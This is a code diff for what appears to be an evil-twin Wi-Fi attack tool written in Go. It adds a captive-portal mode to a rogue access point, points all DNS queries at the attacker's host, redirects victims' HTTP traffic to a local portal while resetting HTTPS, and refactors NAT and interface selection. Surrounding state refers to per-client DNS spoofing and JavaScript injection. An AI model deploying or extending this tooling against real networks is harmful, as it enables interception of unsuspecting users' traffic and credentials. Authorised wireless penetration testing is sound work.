@@ -59,6 +59,8 @@ var (
 	sessionLogDir      = "/tmp"
 	natConfigured      = false
 	redirectConfigured = false
+	captiveDNSActive   = false
+	httpRedirectPort   = "8888"
 )
 
 func NetHunter() {
@@ -604,6 +606,7 @@ type APConfig struct {
 	Interface       string
 	Password        string
 	ProvideInternet bool
+	CaptivePortal   bool
 }
 
 type EvilTwinConfig struct {
@@ -823,6 +826,31 @@ func detectSecurityMode(password string) string {
 	return "WEP"
 }
 
+func buildDnsmasqConfig(config APConfig, extraPath, leasesPath string) string {
+	var b strings.Builder
+	fmt.Fprintf(&b, "interface=%s\n", config.Interface)
+	b.WriteString("bind-interfaces\n")
+	b.WriteString("listen-address=10.0.0.1\n")
+	b.WriteString("dhcp-authoritative\n")
+	b.WriteString("dhcp-range=10.0.0.10,10.0.0.100,12h\n")
+	b.WriteString("dhcp-option=3,10.0.0.1\n")
+	b.WriteString("dhcp-option=6,10.0.0.1\n")
+	b.WriteString("server=1.1.1.1\n")
+	b.WriteString("server=8.8.8.8\n")
+	b.WriteString("log-queries\n")
+	b.WriteString("log-dhcp\n")
+	if strings.TrimSpace(extraPath) != "" {
+		fmt.Fprintf(&b, "conf-file=%s\n", extraPath)
+	}
+	if config.CaptivePortal {
+		b.WriteString("dhcp-option=114,http://10.0.0.1/\n")
+	}
+	if strings.TrimSpace(leasesPath) != "" {
+		fmt.Fprintf(&b, "dhcp-leasefile=%s\n", leasesPath)
+	}
+	return b.String()
+}
+
 func validateSSID(ssid string) (bool, string) {
 	if len(ssid) == 0 {
 		return false, "SSID cannot be empty"
@@ -880,24 +908,13 @@ func startFakeLANLinux(config APConfig) {
 		return
 	}
 
-	dnsmasqConf := `
-interface=` + config.Interface + `
-bind-interfaces
-listen-address=10.0.0.1
-dhcp-authoritative
-dhcp-range=10.0.0.10,10.0.0.100,12h
-dhcp-option=3,10.0.0.1
-dhcp-option=6,10.0.0.1
-server=8.8.8.8
-log-queries
-log-dhcp
-conf-file=` + dnsmasqExtraPath + `
-address=/#/10.0.0.1
-dhcp-option=114,http://10.0.0.1/
-`
-
 	dnsmasqLeasesPath = sessionLogPath("dnsmasq.leases")
-	dnsmasqConf += "dhcp-leasefile=" + dnsmasqLeasesPath + "\n"
+	dnsmasqConf := buildDnsmasqConfig(config, dnsmasqExtraPath, dnsmasqLeasesPath)
+
+	rulesMutex.Lock()
+	captiveDNSActive = config.CaptivePortal
+	rulesMutex.Unlock()
+	syncDnsmasqAddressRules()
 
 	dnsmasqConfPath, err := writeTempConfigFile("dnsmasq_", ".conf", dnsmasqConf)
 	if err != nil {
@@ -973,11 +990,12 @@ func startEvilTwinLinux(config EvilTwinConfig) {
 		Interface:       config.Interface,
 		Password:        config.Password,
 		ProvideInternet: config.ProvideInternet,
+		CaptivePortal:   config.Mode == "captive",
 	})
 }
 
 func applyEvilTwinIptables(apIface string) error {
-	if err := ensureIptablesRedirectFirst(apIface, "80", "8888"); err != nil {
+	if err := ensureIptablesRedirectFirst(apIface, "80", httpRedirectPort); err != nil {
 		return fmt.Errorf("HTTP redirect: %w", err)
 	}
 	if err := ensureInputRejectTCPFirst(apIface, "443"); err != nil {
@@ -993,6 +1011,7 @@ func startHTTPProxy() error {
 		processMu.Unlock()
 		return nil
 	}
+	httpRedirectPort = "8888"
 	processMu.Unlock()
 
 	ln, err := net.Listen("tcp", "0.0.0.0:8888")
@@ -1429,7 +1448,7 @@ func startCaptivePortalListen(ssid string) error {
 	}
 	processMu.Unlock()
 
-	ln, err := net.Listen("tcp", "0.0.0.0:8888")
+	listeners, err := listenTCPPorts("0.0.0.0", []string{"80", "8888"})
 	if err != nil {
 		return err
 	}
@@ -1476,6 +1495,9 @@ func startCaptivePortalListen(ssid string) error {
 			w.Header().Set("Content-Type", "text/html; charset=utf-8")
 			w.WriteHeader(http.StatusOK)
 			w.Write([]byte(buildCaptivePortalSuccessHTML(ssid)))
+			if provideInternet {
+				go releaseCaptivePortalAccess()
+			}
 		default:
 			w.Header().Set("Allow", "GET, POST")
 			w.WriteHeader(http.StatusMethodNotAllowed)
@@ -1486,12 +1508,23 @@ func startCaptivePortalListen(ssid string) error {
 
 	processMu.Lock()
 	captiveServer = srv
+	httpRedirectPort = preferredListenerPort(listeners, "8888")
 	processMu.Unlock()
 
+	var wg sync.WaitGroup
+	wg.Add(len(listeners))
+	for _, listener := range listeners {
+		ln := listener
+		go func() {
+			defer wg.Done()
+			if err := srv.Serve(ln); err != nil && !errors.Is(err, http.ErrServerClosed) {
+				fmt.Printf("%s[!] Captive portal stopped on %s: %v%s\n", utils.Red, ln.Addr().String(), err, utils.Reset)
+			}
+		}()
+	}
+
 	go func() {
-		if err := srv.Serve(ln); err != nil && !errors.Is(err, http.ErrServerClosed) {
-			fmt.Printf("%s[!] Captive portal stopped: %v%s\n", utils.Red, err, utils.Reset)
-		}
+		wg.Wait()
 		processMu.Lock()
 		if captiveServer == srv {
 			captiveServer = nil
@@ -1499,6 +1532,57 @@ func startCaptivePortalListen(ssid string) error {
 		processMu.Unlock()
 	}()
 	return nil
+}
+
+func listenTCPPorts(host string, ports []string) ([]net.Listener, error) {
+	listeners := make([]net.Listener, 0, len(ports))
+	errs := make([]error, 0, len(ports))
+	for _, port := range ports {
+		ln, err := net.Listen("tcp", net.JoinHostPort(host, port))
+		if err != nil {
+			errs = append(errs, fmt.Errorf("%s: %w", port, err))
+			continue
+		}
+		listeners = append(listeners, ln)
+	}
+	if len(listeners) == 0 {
+		return nil, errors.Join(errs...)
+	}
+	return listeners, nil
+}
+
+func preferredListenerPort(listeners []net.Listener, preferred string) string {
+	fallback := preferred
+	for i, ln := range listeners {
+		_, port, err := net.SplitHostPort(ln.Addr().String())
+		if err != nil || port == "" {
+			continue
+		}
+		if i == 0 {
+			fallback = port
+		}
+		if port == preferred {
+			return preferred
+		}
+	}
+	return fallback
+}
+
+func releaseCaptivePortalAccess() {
+	rulesMutex.Lock()
+	wasActive := captiveDNSActive
+	captiveDNSActive = false
+	rulesMutex.Unlock()
+
+	if wasActive {
+		syncDnsmasqAddressRules()
+	}
+
+	if runtime.GOOS != "windows" && apInterface != "" {
+		cleanupEvilTwinRedirect(apInterface)
+	}
+
+	fmt.Printf("%s[✓] Captive portal completed; internet forwarding released%s\n", utils.Green, utils.Reset)
 }
 
 func captiveProbePaths() []string {
@@ -2746,6 +2830,7 @@ func stopAP() {
 	clientBlockedSites = make(map[string][]string)
 	clientDNSSpoof = make(map[string]map[string]string)
 	clientInjectedJS = make(map[string]string)
+	captiveDNSActive = false
 	rulesMutex.Unlock()
 	provideInternet = false
 	internetInterface = ""
@@ -2755,6 +2840,7 @@ func stopAP() {
 	dnsmasqExtraPath = ""
 	natConfigured = false
 	redirectConfigured = false
+	httpRedirectPort = "8888"
 
 	fmt.Printf("%s[✓] Cleanup completed successfully%s\n", utils.Green, utils.Reset)
 	fmt.Printf("%s[✓] Internet connection and wireless adapter restored%s\n", utils.Green, utils.Reset)
@@ -2791,16 +2877,12 @@ func formatBytes(bytes int64) string {
 
 func configureInternetSharing(apIface string) error {
 	upstreamIface, err := detectInternetInterface(apIface)
-	if err != nil {
-		return err
-	}
-
-	if upstreamIface == "" {
-		return fmt.Errorf("no upstream interface with internet route")
-	}
-
-	if upstreamIface == apIface {
-		return fmt.Errorf("upstream interface matches AP interface (%s); use a different host uplink like ethernet, USB tethering/mobile data, or a second Wi-Fi adapter", apIface)
+	if err != nil || upstreamIface == "" || upstreamIface == apIface {
+		selectedIface, selectErr := promptUpstreamInterface(apIface, upstreamIface, err)
+		if selectErr != nil {
+			return selectErr
+		}
+		upstreamIface = selectedIface
 	}
 
 	internetInterface = upstreamIface
@@ -2809,19 +2891,92 @@ func configureInternetSharing(apIface string) error {
 		return fmt.Errorf("failed enabling ip_forward: %w", err)
 	}
 
-	if err := ensureIptablesRule([]string{"-t", "nat", "POSTROUTING", "-o", upstreamIface, "-j", "MASQUERADE"}); err != nil {
+	if err := ensureIptablesRuleFirst([]string{"-t", "nat", "POSTROUTING", "-o", upstreamIface, "-j", "MASQUERADE"}); err != nil {
 		return fmt.Errorf("failed NAT rule: %w", err)
 	}
-	if err := ensureIptablesRule([]string{"FORWARD", "-i", apIface, "-o", upstreamIface, "-j", "ACCEPT"}); err != nil {
+	if err := ensureIptablesRuleFirst([]string{"FORWARD", "-i", apIface, "-o", upstreamIface, "-j", "ACCEPT"}); err != nil {
 		return fmt.Errorf("failed forward rule AP->WAN: %w", err)
 	}
-	if err := ensureIptablesRule([]string{"FORWARD", "-i", upstreamIface, "-o", apIface, "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"}); err != nil {
+	if err := ensureIptablesRuleFirst([]string{"FORWARD", "-i", upstreamIface, "-o", apIface, "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"}); err != nil {
 		return fmt.Errorf("failed forward rule WAN->AP: %w", err)
 	}
 
 	natConfigured = true
 	fmt.Printf("%s[*] Internet uplink detected: %s%s\n", utils.Yellow, upstreamIface, utils.Reset)
 	return nil
+}
+
+func promptUpstreamInterface(apIface, detectedIface string, detectErr error) (string, error) {
+	candidates := listUpstreamInterfaceCandidates(apIface)
+	if len(candidates) == 0 {
+		if detectErr != nil {
+			return "", detectErr
+		}
+		return "", fmt.Errorf("no upstream interface candidates found")
+	}
+
+	if detectErr != nil {
+		fmt.Printf("%s[!] Automatic uplink detection failed: %v%s\n", utils.Yellow, detectErr, utils.Reset)
+	} else if detectedIface == apIface {
+		fmt.Printf("%s[!] Detected uplink is the AP interface (%s)%s\n", utils.Yellow, apIface, utils.Reset)
+	} else {
+		fmt.Printf("%s[!] No usable uplink detected automatically%s\n", utils.Yellow, utils.Reset)
+	}
+
+	fmt.Printf("%sAvailable upstream interfaces:%s\n", utils.Blue, utils.Reset)
+	for i, iface := range candidates {
+		fmt.Printf("%s  [%d] %s%s\n", utils.Green, i+1, iface, utils.Reset)
+	}
+
+	reader := bufio.NewReader(os.Stdin)
+	fmt.Printf("%sSelect upstream interface for internet sharing: %s", utils.Green, utils.Reset)
+	input, _ := reader.ReadString('\n')
+	input = strings.TrimSpace(input)
+
+	var choice int
+	if _, err := fmt.Sscanf(input, "%d", &choice); err != nil || choice < 1 || choice > len(candidates) {
+		return "", fmt.Errorf("no upstream interface selected")
+	}
+
+	return candidates[choice-1], nil
+}
+
+func listUpstreamInterfaceCandidates(apIface string) []string {
+	ifaces, err := net.Interfaces()
+	if err != nil {
+		return nil
+	}
+
+	candidates := make([]string, 0, len(ifaces))
+	for _, iface := range ifaces {
+		name := strings.TrimSpace(iface.Name)
+		if name == "" || name == apIface {
+			continue
+		}
+		if iface.Flags&net.FlagUp == 0 {
+			continue
+		}
+		if isIgnoredUpstreamInterface(name) {
+			continue
+		}
+		candidates = append(candidates, name)
+	}
+	sort.Strings(candidates)
+	return candidates
+}
+
+func isIgnoredUpstreamInterface(name string) bool {
+	if name == "lo" {
+		return true
+	}
+
+	prefixes := []string{"br-", "docker", "veth", "virbr", "p2p-dev"}
+	for _, prefix := range prefixes {
+		if strings.HasPrefix(name, prefix) {
+			return true
+		}
+	}
+	return false
 }
 
 func cleanupInternetSharing(apIface, upstreamIface string) {
@@ -2842,6 +2997,8 @@ func cleanupEvilTwinRedirect(apIface string) {
 		return
 	}
 	deleteIptablesRule(append([]string{"INPUT"}, "-i", apIface, "-p", "tcp", "--dport", "443", "-j", "REJECT", "--reject-with", "tcp-reset"))
+	deleteIptablesRule([]string{"-t", "nat", "PREROUTING", "-i", apIface, "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-ports", httpRedirectPort})
+	deleteIptablesRule([]string{"-t", "nat", "PREROUTING", "-i", apIface, "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-ports", "80"})
 	deleteIptablesRule([]string{"-t", "nat", "PREROUTING", "-i", apIface, "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-ports", "8888"})
 	deleteIptablesRule([]string{"-t", "nat", "PREROUTING", "-i", apIface, "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-ports", "8888"})
 	redirectConfigured = false
@@ -2926,15 +3083,31 @@ func syncDnsmasqAddressRules() {
 	if dnsmasqExtraPath == "" {
 		return
 	}
-	var b strings.Builder
 	rulesMutex.RLock()
-	keys := make([]string, 0, len(dnsSpoof))
-	for d := range dnsSpoof {
-		keys = append(keys, d)
+	captive := captiveDNSActive
+	rules := make(map[string]string, len(dnsSpoof))
+	for domain, target := range dnsSpoof {
+		rules[domain] = target
+	}
+	rulesMutex.RUnlock()
+	_ = os.WriteFile(dnsmasqExtraPath, []byte(buildDnsmasqAddressRules(captive, rules)), 0644)
+	reloadDnsmasq()
+}
+
+func buildDnsmasqAddressRules(captive bool, rules map[string]string) string {
+	var b strings.Builder
+	if captive {
+		b.WriteString("address=/#/10.0.0.1\n")
+	}
+
+	keys := make([]string, 0, len(rules))
+	for domain := range rules {
+		keys = append(keys, domain)
 	}
 	sort.Strings(keys)
+
 	for _, domain := range keys {
-		target := dnsSpoof[domain]
+		target := rules[domain]
 		dom := strings.TrimSpace(strings.TrimPrefix(domain, "."))
 		if dom == "" {
 			continue
@@ -2948,9 +3121,8 @@ func syncDnsmasqAddressRules() {
 			fmt.Fprintf(&b, "address=/www.%s/%s\n", dom, ip)
 		}
 	}
-	rulesMutex.RUnlock()
-	_ = os.WriteFile(dnsmasqExtraPath, []byte(b.String()), 0644)
-	reloadDnsmasq()
+
+	return b.String()
 }
 
 func reloadDnsmasq() {
@@ -2972,6 +3144,28 @@ func ensureIptablesRule(ruleSpec []string) error {
 	return exec.Command("iptables", addArgs...).Run()
 }
 
+func ensureIptablesRuleFirst(ruleSpec []string) error {
+	checkArgs := append([]string{"-C"}, ruleSpec...)
+	if err := exec.Command("iptables", checkArgs...).Run(); err == nil {
+		return nil
+	}
+
+	insertArgs := iptablesInsertArgs(ruleSpec)
+	return exec.Command("iptables", insertArgs...).Run()
+}
+
+func iptablesInsertArgs(ruleSpec []string) []string {
+	if len(ruleSpec) >= 4 && ruleSpec[0] == "-t" {
+		args := []string{"-t", ruleSpec[1], "-I", ruleSpec[2], "1"}
+		return append(args, ruleSpec[3:]...)
+	}
+	if len(ruleSpec) >= 1 {
+		args := []string{"-I", ruleSpec[0], "1"}
+		return append(args, ruleSpec[1:]...)
+	}
+	return []string{"-I"}
+}
+
 func deleteIptablesRule(ruleSpec []string) {
 	checkArgs := append([]string{"-C"}, ruleSpec...)
 	if err := exec.Command("iptables", checkArgs...).Run(); err != nil {
@@ -2983,44 +3177,60 @@ func deleteIptablesRule(ruleSpec []string) {
 }
 
 func detectInternetInterface(apIface string) (string, error) {
+	if iface, err := detectRouteInterface(apIface, "1.1.1.1"); err == nil && iface != "" {
+		return iface, nil
+	}
+	if iface, err := detectRouteInterface(apIface, "8.8.8.8"); err == nil && iface != "" {
+		return iface, nil
+	}
+
 	routeOutput, err := exec.Command("ip", "route", "show", "default").Output()
 	if err != nil {
 		return "", err
 	}
 
-	lines := strings.Split(string(routeOutput), "\n")
+	if iface := parseRouteInterface(string(routeOutput), apIface); iface != "" {
+		return iface, nil
+	}
+
+	if iface := parseRouteInterface(string(routeOutput), ""); iface != "" {
+		return iface, nil
+	}
+
+	return "", fmt.Errorf("default route not found")
+}
+
+func detectRouteInterface(apIface, target string) (string, error) {
+	output, err := exec.Command("ip", "route", "get", target).Output()
+	if err != nil {
+		return "", err
+	}
+	if iface := parseRouteInterface(string(output), apIface); iface != "" {
+		return iface, nil
+	}
+	if iface := parseRouteInterface(string(output), ""); iface != "" {
+		return iface, nil
+	}
+	return "", fmt.Errorf("route interface not found")
+}
+
+func parseRouteInterface(output, apIface string) string {
+	lines := strings.Split(output, "\n")
 	for _, line := range lines {
 		line = strings.TrimSpace(line)
-		if !strings.HasPrefix(line, "default") {
-			continue
-		}
 
 		fields := strings.Fields(line)
 		for i := 0; i < len(fields)-1; i++ {
 			if fields[i] == "dev" {
 				candidate := fields[i+1]
 				if candidate != "" && candidate != apIface {
-					return candidate, nil
+					return candidate
 				}
 			}
 		}
 	}
 
-	for _, line := range lines {
-		line = strings.TrimSpace(line)
-		if !strings.HasPrefix(line, "default") {
-			continue
-		}
-
-		fields := strings.Fields(line)
-		for i := 0; i < len(fields)-1; i++ {
-			if fields[i] == "dev" {
-				return fields[i+1], nil
-			}
-		}
-	}
-
-	return "", fmt.Errorf("default route not found")
+	return ""
 }
 
 func supportsAPMode() (bool, error) {
